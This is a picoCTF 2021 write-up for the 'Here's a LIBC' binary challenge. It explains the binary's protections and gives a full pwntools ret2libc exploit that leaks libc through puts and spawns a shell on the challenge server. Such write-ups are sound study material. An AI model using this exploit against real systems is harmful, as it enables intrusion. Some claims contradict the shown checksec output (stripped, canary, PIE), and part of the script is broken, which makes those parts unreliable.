---
title: "picoCTF 2021 - Here's a LIBC"
date: 2022-5-24 00:00:00 +/-0500
categories: [Cybersecurity, CTFs]
tags: [CTF, picoCTF2021, cybersecurity, binary exploit]
---

## Description

AUTHOR: MADSTACKS

Description: I am once again asking for you to pwn this binary vuln libc.so.6 Makefile nc mercury.picoctf.net 1774

Hints: PWNTools has a lot of useful features for getting offsets.

## References

1. [https://faraz.faith/2019-10-12-picoctf-2019-heap-challs/](https://faraz.faith/2019-10-12-picoctf-2019-heap-challs/)

2. [https://gitlab.com/WhatTheFuzz-CTFs/ctfs/-/tree/main/picoCTF/binary-exploitation/heres-a-libc](https://gitlab.com/WhatTheFuzz-CTFs/ctfs/-/tree/main/picoCTF/binary-exploitation/heres-a-libc)

3. [https://ctf101.org/binary-exploitation/relocation-read-only/](https://ctf101.org/binary-exploitation/relocation-read-only/)

4. [https://heartburn.dev/picoctf-2021-binary-exploitation/#here-s-a-libc](https://heartburn.dev/picoctf-2021-binary-exploitation/#here-s-a-libc)

## My Approach

In challenges like this one, you are given an executable, a libc library, and a
Makefile to work with. And the first thing I do is to find some information
about the executable file.

```
$ file vuln             
vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=e5dba3e6ed29e457cd104accb279e127285eecd0, not stripped
```

```
$ checksec --file=vuln                                                                                                                                                               130 ⨯
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   RW-RUNPATH   68) Symbols       No    0               0               vuln

```

By running `file` and `checksec` on the given file, we can see that the file is
stripped, dynamically linked 64-bit binary with some protections enabled. Let's
take a quick look at what the protections do.

- RELRO: This is about Global Offset Table (GOT) and when it is set to "Full
    RELRO", we won't be able to overwrite a function pointer or hijack the
    control flow of the program. When it is set to "Partial RELRO", which is the
    default setting in GCC, it will force the GOT to come before the BSS (block
    starting symbol) in
    memory so that it prevents the risk of a buffer overflows on a global
    variable overwriting GOT entries.

- Canary found: This means that there is a stack canary which prevents buffer
    overflows. It can still be exploited by bypassing the canary.

- NX (No eXecute) enabled: This means that there is **NO** memory region that is both writable
    and executable. So this can tell us that injecting shellcode might not be
    the option for this particular program. 

- PIE enabled: PIE (Position Independent Executable) allows the program to be
    executed with randomized base address. So, if it is enabled, it prevents
    attacks such as ROP or ret2libc since attackers won't be able to know any
    addresses unless there are some kinds of address leaks.

And the next thing we can do is to get the source code by using Ghidra. Then we
can get these three functions: 

```c
// main
void main(undefined4 param_1,undefined8 param_2)

{
  char converted_str;
  char acStack168 [24];
  undefined8 uStack144;
  undefined8 local_88;
  undefined4 local_7c;
  undefined8 local_78;
  undefined8 local_70;
  undefined8 local_68;
  undefined2 local_60;
  undefined local_5e;
  char *welcome_string;
  undefined8 local_48;
  ulong local_40;
  __gid_t local_34;
  ulong local_30;
  
  uStack144 = 0x40079c;
  local_88 = param_2;
  local_7c = param_1;
  setbuf(stdout,(char *)0x0);
  uStack144 = 0x4007a1;
  local_34 = getegid();
  uStack144 = 0x4007bb;
  setresgid(local_34,local_34,local_34);
  local_40 = 0x1b;
  local_78 = 0x20656d6f636c6557;
  local_70 = 0x636520796d206f74;
  local_68 = 0x6576726573206f68;
  local_60 = 0x2172;
  local_5e = 0;
  local_48 = 0x1a;
  welcome_string = acStack168;
  for (local_30 = 0; local_30 < local_40; local_30 = local_30 + 1) {
    converted_str = convert_case((int)*(char *)((long)&local_78 + local_30),local_30);
    welcome_string[local_30] = converted_str;
  }
  puts(welcome_string);
  do {
    do_stuff();
  } while( true );
}


```

```c
// do_stuff

void do_stuff(void)

{
  char cVar1;
  undefined local_89;
  char input_buf [112];
  undefined8 local_18;
  ulong local_10;
  
  local_18 = 0;
  __isoc99_scanf("%[^\n]",input_buf);
  __isoc99_scanf(&DAT_0040093a,&local_89);
  for (local_10 = 0; local_10 < 100; local_10 = local_10 + 1) {
    cVar1 = convert_case((int)input_buf[local_10],local_10);
    input_buf[local_10] = cVar1;
  }
  puts(input_buf);
  return;
}

```

### Gathering Information

Looking at the main function, within the while loop, we can see that
`do_stuff()` does the most work here. So taking a look at `do_stuff()`, we can
see that it accepts user input until it sees a new line to local_88[112]. I feel
like we can do something by overflowing the buffer! However, remember, this file
has NX enabled so we just can't overwrite the address to return to the stack (so
we should have the return address point to something that is already in libc!).


First, let's just try to pass in some arbitrary stuff to see if we can crash the
program first.

Running the program under gef, I created a cyclic with the size of 256 bytes and
n=8. Then it gives you something like this
'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac'.
Once you provide this as the input to the prompt you see when the program gets
executed, we can see that `$rsp` gets overwritten by the input.

```
0x007fffffffde58│+0x0000: "jaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabva[...]"      ← $rsp
```

As we can see, `$rsp` starts with 'jaab...' and if you move onto the next
assembly instruction, the program crashes. So I think that if we  

Use metasploit framework's pattern_create and pattern_offset, I was able to get
the offset 136 which means the gap between the buffer and the return address is
136 bytes big. So our strategy should be to fill 136 bytes with a bunch of As
and fil the return address with whatever instructions that we want the program
to execute instead.

Next thing we need to do is to find things that we can use to achieve our goal.
This means that we would need to find memory addresses to functions that we need
in order to lunch a shell on this remote server.

### ASLR

ASLR is a mitigation technique that is used to prevent memory exploitation by
randomizing memory addresses of stack, heap, and libraries each time a process runs. Because of this, we can know that the functions that we should look from `libc` will always move aroud in terms of the memory addresses to them. What we should do in this case is to use one of the built-in functions that is used in the program to find out the offset to `libc` library that is loaded into the program at the moment. Once we get a memory address, we are going to use that to calcuate offsets to the functions that we need .

From the source code above, we can see that `puts()` is used in `do_stuff()`
after accepting a user input and modifying the input. So it is a hint that we
can use `puts()` to calculate the offset to the libc library.

### PLT & GOT

Reference: [https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt_and_got)

PLT: Procedure Linkage Table which is used to call external procedures/functions
whose address isn't known in the time of linking and is left to be resolved by
the dynamic linker at run time

PLT is a readable section of memory that jumps to the GOT to call a function.
GOT by extension is a writable section of memory that looks up the function
pointers through the dynamic linker the first time it is called.

### Solution

`pwntools` provides many great features and we can utilize one of the features
to get the plt/got address to `puts` and `main` functions. 

```py
from pwn import *

vuln = ELF("./vuln_patched")

context.binary = './vuln_patched'
libc = ELF("./libc.so.6")

# r = vuln.process()
r = remote("mercury.picoctf.net", 1774)

# get the address to the puts function in PLT
puts_plt = vuln.plt['puts']
# get the addres to the main function in PLT
main_plt = vuln.symbols['main']
# As the GOT is part of the binary, it will always be a constant offset away from the base
puts_got = vuln.got['puts']

# this is the gadget 'pop rdi, ret'
# why this? here is a great article that explains this well
# https://ir0nstone.gitbook.io/notes/types/stack/return-oriented-programming/gadgets
gadget = 0x400913


payload = b"A" * 136
payload += p64(gadget)
payload += p64(puts_got)
payload += p64(puts_plt)
payload += p64(main_plt)

print(payload)

print(r.recvline())
r.sendline(payload)
#r.interactive()

# second rop

print(r.recvline())
received_line = r.recvline().strip()
print(received_line)
leak = u64(received_line.ljust(8, b"\x00"))
print(hex(leak))

# Once we get the pointers to to puts' plt/got and main's address (the purpose
of the first payload),
# we can get libc address using libc.sysmbols['puts']

libc.address = leak - libc.symbols['puts'] # now we have the base libc addr

binsh = next(libc.search(b"/bin/sh")) # the actual string is the next one from the memory address that is being pointed to
system = libc.symbols['system']

payload2 = b"A" * 136
payload2 += p64(0x000000000040052e) # ret instruction (gadget) to algin the stack
payload2 += p64(gadget) # pop rdi, ret
payload2 += p64(binsh) # this will be put into rdi
payload2 += p64(system) # call system with /bin/sh as its first arg

r.clean()
r.sendline(payload2)
r.interactive()
```

This was a very interesting challenge that taught me a lot of things. Please let
me know if I missed something or if my understanding is not correct by sending
me an email. Thanks for reading!

